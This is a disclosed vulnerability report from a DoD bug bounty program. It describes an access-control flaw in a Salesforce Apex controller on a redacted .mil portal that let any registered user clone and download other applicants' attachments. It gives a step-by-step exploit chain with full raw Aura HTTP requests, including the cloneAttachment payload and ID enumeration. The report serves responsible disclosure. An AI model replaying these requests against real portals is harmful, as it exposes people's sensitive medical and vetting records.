---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-access-control-generic
  - env/web
  - vuln/idor
  - vuln/info-disclosure
  - vuln/cors-misconfig
  - impact/sensitive-data
  - trigger/cors-origin
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2025-02-12
submitted: 2025-01-20T16:46:59.322Z
bounty_usd: null
votes: 142
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "oxylis"
source: "https://hackerone.com/reports/2950536"
title: "Applicant security exam Attachments/Documents accessible through an IDOR/BAC on the custom Apex controller on https://█████.mil "
---
# Applicant security exam Attachments/Documents accessible through an IDOR/BAC on the custom Apex controller on https://█████.mil 

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 142 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2025-02-12

- Report: [https://hackerone.com/reports/2950536](https://hackerone.com/reports/2950536)
- CWE: Improper Access Control - Generic
- Submitted: 2025-01-20T16:46:59.322Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Greetings DoD team,

I've uncovered a highly dangerous IDOR on the ██████████ portal.

An attacker can switch the ownership of any Attachment record submitted through the portal and access the files. These contain highly sensitive information as they include all materials/documentation submitted as part of the vetting procedures prior to visiting the █████, e.g. personal medical records. Potentially this might include internal attachments as well.

An attacker is able to exploit the following chain:

1. Generate/enumerate a list of Salesforce Attachment Id's. These are highly predictable: example methodology/script here: https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/.
2. Plug the generated list of Id's into the broken Apex controller (apex://ExAM.FileUploadController/ACTION$cloneAttachment), clone any Attachment record within the CRM and link it to a record they own (e.g. their own Contact). This gives read access to the record. 
3. Download the newly-linked Attachment as their own via a servlet/servlet.FileDownload?file=* request.

**IMPORTANT NOTE: unfortunately during testing inadvertent access was gained to a confidential record (https://██████████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MaT3MAK). Please remove the link to the test Contact as a matter of urgency. Apologies!**

## Impact

High-impact sensitive data leak.

## System Host(s)
██████.mil

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
#  Steps to reproduce/POC

1. Create a new ███████ request: https://███████.mil/Portal██████/s/████████-creation
2. After submitting the form, verify the account by following the link received in email (Welcome to Your ████████ Reservation Portal My████s Account...)
3. After changing the password and logging into ██████.mil/Portal████/s/, find any POST request with aura.token present in the HTTP traffic, e.g:

```
POST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: █████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn![REDACTED - see source report]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://█████.mil/Portal█████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 1310
Origin: https://█████████.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2294%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableAttributeLoaderController%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%22c2a69af8-e08e-4cc8-a677-d55b0ca0fa94%22%2C%22publishedChangelistNum%22%3A91%2C%22audienceKey%22%3A%22ClyOkxQ47tauZ_s9udPOFA%22%7D%2C%22version%22%3A%2262.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████%2Fs%2F&aura.token=[REDACTED - see source report]
```

4. Send the request to Repeater, modify as below and send. This will pull some info from your own Contact record. Save the Contact Id (003Rw000002SJcsIAG in my case)

```
POST /Portal█████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: █████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn![REDACTED - see source report]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://█████.mil/Portal█████████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 1115
Origin: https://██████.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████████%2Fs%2F&aura.token=[REDACTED - see source report]
```

█████████

5. Modify the request again as below, setting the value of parentId as as your Contact Id extracted in previous step and attachmentId as 00PRw000000MaT3MAK:

```
POST /Portal█████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: █████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn![REDACTED - see source report]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://███████.mil/Portal███████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 999
Origin: https://███████.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message={"actions":[{"id":"20;a","descriptor":"apex://ExAM.FileUploadController/ACTION$cloneAttachment","callingDescriptor":"markup://ExAM:AssessmentViewer","params":{"attachmentId":"00PRw000000MaT3MAK","parentId":"003Rw000002SJcsIAG"},"version":null}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal█████████%2Fs%2F&aura.token=[REDACTED - see source report]
```
█████

6. Modify request again and send, this time calling all accessible Attachment records. Note that a new file has just been cloned/created, copy the Id: 00PRw000000MbSLMA0.

```
POST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: ██████.mil
Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn![REDACTED - see source report]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://████████.mil/Portal██████/s/
X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
X-Sfdc-Request-Id: 1650000000ce00391b
X-Sfdc-Page-Cache: 05da72b5c160b86c
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: bb38cda3039f713b
X-B3-Spanid: 2e48fc5f161b8aa4
X-B3-Sampled: 0
Content-Length: 1118
Origin: https://███.mil
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Attachment","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal████████%2Fs%2F&aura.token=[REDACTED - see source report]
```
████████

7. Insert the ID into URL as below (same session) and verify that file is accessible from your account:

https://█████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MbSLMA0


# Notes

To ease testing on your side, I am also attaching a list of Attachment Id's that I generated using the method mentioned in the beginning of the report.

Hope you find this report helpful - look forward to your feedback.

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2025-01-20** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **2025-01-30** @oxylis: Hey team @agent-p1 - great news! Can we disclose?
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
